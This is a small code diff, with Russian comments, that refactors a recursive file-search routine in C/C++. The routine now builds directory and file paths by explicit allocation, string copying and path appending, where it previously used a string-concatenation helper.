@@ -1246,9 +1246,11 @@ bool SearchFiles(PCHAR Path, PCHAR Mask, bool Recursive, DWORD FileAttributes,
 	if (STR::IsEmpty(Path) || STR::IsEmpty(Mask) || CallBack == NULL)
 		return true;
 
-	PCHAR SearchMask = STR::New(2, Path, Mask);
+	PCHAR SearchMask = STR::Alloc( m_lstrlen(Path) + m_lstrlen(Mask) + 10 );
 	if (SearchMask == NULL)
 		return true;
+	m_lstrcpy( SearchMask, Path );
+	pPathAppendA( SearchMask, Mask );
 
 	//  Ищем первую директорию
 	WIN32_FIND_DATAA Find;
@@ -1294,10 +1296,11 @@ bool SearchFiles(PCHAR Path, PCHAR Mask, bool Recursive, DWORD FileAttributes,
 		{
             Count++;
 			// Собираем полное имя
-            if ((Find.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0)
-				NewPath = STR::New(3, Path, Find.cFileName, "\\");
-			else
-				NewPath = STR::New(2, Path, Find.cFileName);
+			NewPath = STR::Alloc( m_lstrlen(Path) + m_lstrlen(Find.cFileName) + 10 );
+			m_lstrcpy( NewPath, Path );
+			pPathAppendA( NewPath, Find.cFileName );
+			if( Find.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
+				m_lstrcat( NewPath, "\\" );
 
 			// Вызываем метод обратной связи
 			if ((Find.dwFileAttributes & FileAttributes) != 0)
